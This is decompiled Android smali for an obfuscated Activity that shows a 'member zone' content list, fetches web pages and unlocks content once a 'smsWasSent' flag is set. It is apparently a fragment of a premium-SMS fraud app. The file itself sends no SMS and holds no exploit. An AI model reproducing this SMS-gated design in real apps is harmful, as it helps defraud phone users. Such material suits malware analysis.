.class public Lcom/adc58a797/ac31b3236/a740675ee/a56246149;
.super Landroid/app/Activity;
.source "abOgPiDmt.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/adc58a797/ac31b3236/a740675ee/a56246149$a7d3ad782;
    }
.end annotation


# instance fields
.field private adapter:Landroid/widget/ArrayAdapter;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Landroid/widget/ArrayAdapter",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private buttonExit:Landroid/widget/Button;

.field private buttonRefresh:Landroid/widget/Button;

.field private data:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field dialog:Landroid/app/ProgressDialog;

.field private links:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private lv1:Landroid/widget/ListView;

.field private final memberZone:Ljava/lang/String;

.field private memberZoneLink:Ljava/lang/String;

.field private types:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>()V
    .locals 3

    const/4 v2, 0x0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    iput-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->adapter:Landroid/widget/ArrayAdapter;

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

    move-result-object v0

    const-string v1, "memberZone"

    invoke-virtual {v0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZone:Ljava/lang/String;

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZone:Ljava/lang/String;

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    iput-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->dialog:Landroid/app/ProgressDialog;

    return-void
.end method

.method static synthetic access$000(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;)Ljava/util/List;
    .locals 1

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->types:Ljava/util/List;

    return-object v0
.end method

.method static synthetic access$100(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$102(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    iput-object p1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    return-object p1
.end method

.method static synthetic access$200(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZone:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$300(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;)Ljava/util/List;
    .locals 1

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->links:Ljava/util/List;

    return-object v0
.end method

.method static synthetic access$400(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;)Ljava/util/List;
    .locals 1

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->data:Ljava/util/List;

    return-object v0
.end method

.method static synthetic access$500(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;)Landroid/widget/ArrayAdapter;
    .locals 1

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->adapter:Landroid/widget/ArrayAdapter;

    return-object v0
.end method

.method static synthetic access$600(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;)Landroid/widget/ListView;
    .locals 1

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->lv1:Landroid/widget/ListView;

    return-object v0
.end method

.method static synthetic access$602(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;Landroid/widget/ListView;)Landroid/widget/ListView;
    .locals 0

    iput-object p1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->lv1:Landroid/widget/ListView;

    return-object p1
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 4

    const-string v0, "MemberActivity"

    const-string v1, "onCreate"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->init(Landroid/content/Context;)V

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->init(Landroid/content/Context;)V

    const v0, 0x7f07000d

    invoke-virtual {p0, v0}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->buttonExit:Landroid/widget/Button;

    const v0, 0x7f07000e

    invoke-virtual {p0, v0}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->buttonRefresh:Landroid/widget/Button;

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->buttonExit:Landroid/widget/Button;

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v1

    invoke-virtual {v1}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v1

    const-string v2, "ui.memberscreen.buttons.exit.caption"

    iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->buttonExit:Landroid/widget/Button;

    invoke-virtual {v3}, Landroid/widget/Button;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getOverridableValueForLocation(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->buttonRefresh:Landroid/widget/Button;

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v1

    invoke-virtual {v1}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v1

    const-string v2, "ui.memberscreen.buttons.refresh.caption"

    iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->buttonRefresh:Landroid/widget/Button;

    invoke-virtual {v3}, Landroid/widget/Button;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getOverridableValueForLocation(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;

    move-result-object v0

    invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getData()Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->data:Ljava/util/List;

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;

    move-result-object v0

    invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getLinks()Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->links:Ljava/util/List;

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;

    move-result-object v0

    invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getTypes()Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->types:Ljava/util/List;

    const v0, 0x7f030002

    invoke-virtual {p0, v0}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->setContentView(I)V

    const-string v0, "Content"

    invoke-virtual {p0, v0}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->setTitle(Ljava/lang/CharSequence;)V

    new-instance v0, Landroid/widget/ArrayAdapter;

    const v1, 0x1090003

    iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->data:Ljava/util/List;

    invoke-direct {v0, p0, v1, v2}, Landroid/widget/ArrayAdapter;-><init>(Landroid/content/Context;ILjava/util/List;)V

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->adapter:Landroid/widget/ArrayAdapter;

    const v0, 0x7f07000c

    invoke-virtual {p0, v0}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ListView;

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->lv1:Landroid/widget/ListView;

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->lv1:Landroid/widget/ListView;

    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->adapter:Landroid/widget/ArrayAdapter;

    invoke-virtual {v0, v1}, Landroid/widget/ListView;->setAdapter(Landroid/widget/ListAdapter;)V

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->lv1:Landroid/widget/ListView;

    new-instance v1, Lcom/adc58a797/ac31b3236/a740675ee/a56246149$ac4ca4238;

    invoke-direct {v1, p0}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149$ac4ca4238;-><init>(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;)V

    invoke-virtual {v0, v1}, Landroid/widget/ListView;->setOnItemClickListener(Landroid/widget/AdapterView$OnItemClickListener;)V

    iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->data:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->readWebpage(Landroid/view/View;Z)V

    :cond_0
    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 4

    const/4 v1, 0x1

    const/4 v2, 0x4

    if-ne p1, v2, :cond_1

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;

    move-result-object v2

    invoke-virtual {v2}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getHistory()Ljava/util/Stack;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/Stack;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_0

    :goto_0
    return v1

    :cond_0
    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;

    move-result-object v2

    invoke-virtual {v2}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getHistory()Ljava/util/Stack;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/Stack;->pop()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->readWebpage(Landroid/view/View;Z)V

    goto :goto_0

    :cond_1
    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v1

    goto :goto_0
.end method

.method public onMemberExitClicked(Landroid/view/View;)V
    .locals 2

    const-string v0, "MemberActivity"

    const-string v1, "exit clicked"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->finish()V

    return-void
.end method

.method public onMemberOpenClicked(Landroid/view/View;)V
    .locals 2

    const-string v0, "MemberActivity"

    const-string v1, "Open clicked"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v0, 0x1

    invoke-virtual {p0, p1, v0}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->readWebpage(Landroid/view/View;Z)V

    return-void
.end method

.method public readWebpage(Landroid/view/View;Z)V
    .locals 5

    const/4 v4, 0x1

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

    move-result-object v1

    const-string v2, "smsWasSent"

    invoke-virtual {v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->existsRuntimeValue(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZone:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    const-string v2, "?o=1"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    :cond_0
    :goto_0
    if-eqz p2, :cond_1

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;

    move-result-object v1

    invoke-virtual {v1}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getCache()Ljava/util/HashMap;

    move-result-object v1

    iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;

    move-result-object v1

    invoke-virtual {v1}, Lcom/adc58a797/ac31b3236/a740675ee/a8765e762;->getCache()Ljava/util/HashMap;

    move-result-object v1

    iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "REMOVED_FROM_CACHE"

    iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    invoke-static {v1, v2}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    const-string v1, ""

    const-string v2, "Please wait for few seconds..."

    invoke-static {p0, v1, v2, v4}, Landroid/app/ProgressDialog;->show(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Landroid/app/ProgressDialog;

    move-result-object v1

    iput-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->dialog:Landroid/app/ProgressDialog;

    const-string v1, "MemberActivity"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "readWebPage = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149$a7d3ad782;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149$a7d3ad782;-><init>(Lcom/adc58a797/ac31b3236/a740675ee/a56246149;Lcom/adc58a797/ac31b3236/a740675ee/a56246149$ac4ca4238;)V

    new-array v1, v4, [Ljava/lang/String;

    const/4 v2, 0x0

    iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/a56246149$a7d3ad782;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    return-void

    :cond_2
    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    const-string v2, "&o=1"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a56246149;->memberZoneLink:Ljava/lang/String;

    goto :goto_0
.end method
